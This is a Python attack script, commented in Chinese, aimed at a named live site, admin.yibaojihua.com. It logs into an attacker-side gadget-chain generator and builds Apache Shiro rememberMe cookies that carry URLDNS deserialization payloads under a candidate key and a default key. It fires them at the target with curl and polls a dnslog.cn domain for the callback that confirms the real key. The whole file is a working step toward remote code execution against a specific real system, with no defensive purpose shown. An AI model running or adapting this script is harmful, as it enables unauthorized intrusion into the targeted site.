import os
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
admin.yibaojihua.com URLDNS 对照验证 — 判定 fCq+ key 真伪
对照逻辑:
  正确 key  → URLDNS 对象被成功反序列化 → URL.hashCode 触发 DNS 解析 → 子域回连
  错误 key  → AES 解密失败 → 反序列化不开始 → 无回连
两个子域同一秒发, 谁回连谁是真的。
"""
import requests, re, time, subprocess, json, os, sys

BASE = "http://<your-attack-server>:8011"
TARGET = "https://admin.yibaojihua.com/"
GOOD_KEY = "fCq+/xW488hMTCD+cmJ3aQ=="          # jar SPC 唯一命中候选 key
BAD_KEY  = "kPH+bIxk5D2deZiIxcaaaA=="          # 已知错 key(默认shiro)
DOMAIN   = "aylm1n.dnslog.cn"
OUT_DIR  = os.path.dirname(os.path.abspath(__file__))

# ---------- 1. 登录 javachain ----------
s = requests.Session()
try:
    r = s.get(BASE + "/", timeout=10)
except Exception as e:
    print(f"[!] javachain 连不上: {e}"); sys.exit(1)
xsrf = s.cookies.get("XSRF-TOKEN")
if not xsrf:
    print("[!] 无 XSRF-TOKEN cookie, 页面: ", r.text[:200]); sys.exit(1)
r = s.post(BASE + "/auth/login", json={"username": "admin", "password": os.environ.get("JCHAIN_PASS","")},
           headers={"X-XSRF-TOKEN": xsrf}, timeout=10)
print(f"[*] 登录: HTTP {r.status_code}  XSRF={xsrf[:20]}...  JSESSIONID={'yes' if s.cookies.get('JSESSIONID') else 'no'}")

# ---------- 2. 生成 4 个 URLDNS cookie ----------
def gen(shiroKey, gcm, dom, name):
    body = {"payload": {"type": "ShiroPayload", "encode": "base64", "options": {"urlEncoding": False}},
            "chain": [
                {"gadget": "ShiroPayload", "args": {"shiroKey": shiroKey, "gcmMode": gcm, "dirtyLength": 0}},
                {"gadget": "URLDNS", "args": {"domainOrUrl": dom}}
            ]}
    r = s.post(BASE + "/api/generate", json=body, headers={"X-XSRF-TOKEN": xsrf}, timeout=30)
    j = r.json()
    if j.get("code") != 0:
        print(f"[!] generate 失败 {name}: {j}"); return None
    c = j["data"]["output"]["content"]
    p = os.path.join(OUT_DIR, name)
    with open(p, "w") as f:
        f.write(c)
    print(f"[*] 生成 {name}: {len(c)} 字符")
    return c

cases = [
    ("ud_adm8_ok_CBC.cookie", GOOD_KEY, False, f"adm8.{DOMAIN}"),
    ("ud_adm8_ok_GCM.cookie", GOOD_KEY, True,  f"adm8.{DOMAIN}"),
    ("ud_cont8_bad_CBC.cookie", BAD_KEY, False, f"cont8.{DOMAIN}"),
    ("ud_cont8_bad_GCM.cookie", BAD_KEY, True,  f"cont8.{DOMAIN}"),
]
for name, key, gcm, dom in cases:
    gen(key, gcm, dom, name)

# ---------- 3. 依次发送到目标, 记录 Set-Cookie ----------
print("\n=== 发送到目标 ===")
for name, key, gcm, dom in cases:
    p = os.path.join(OUT_DIR, name)
    val = open(p).read().strip()
    # 用 subprocess curl, --noproxy '*' 避免走本机代理
    curl_cmd = ["curl", "-s", "-k", "--noproxy", "*", "-D", "-", "-o", "/dev/null",
                "-H", f"Cookie: rememberMe={val}", TARGET, "--max-time", "20"]
    proc = subprocess.run(curl_cmd, capture_output=True, text=True, timeout=30)
    sc = proc.stdout
    dm = re.findall(r'Set-Cookie: ([^;]+);', sc)
    has_rm = any('rememberMe=deleteMe' in d for d in dm)
    print(f"[{name}] HTTP头状态: {sc.splitlines()[0] if sc else '?'}  Set-Cookie: {dm[:2]}  deleteMe={'是' if has_rm else '否/无'}")

print("\n[*] 4 个请求已发出, 等待 30s 后查 DNSLog 回连")
time.sleep(30)

# ---------- 4. 轮询 DNSLog ----------
d = os.path.join(os.path.dirname(OUT_DIR), "..", "..", "dnslog_helper", "dnslog.py")
poll = subprocess.run(["python", os.path.normpath(d), "poll"], capture_output=True, text=True, timeout=60)
print("\n=== DNSLog 回连 ===")
print(poll.stdout)
print(poll.stderr)
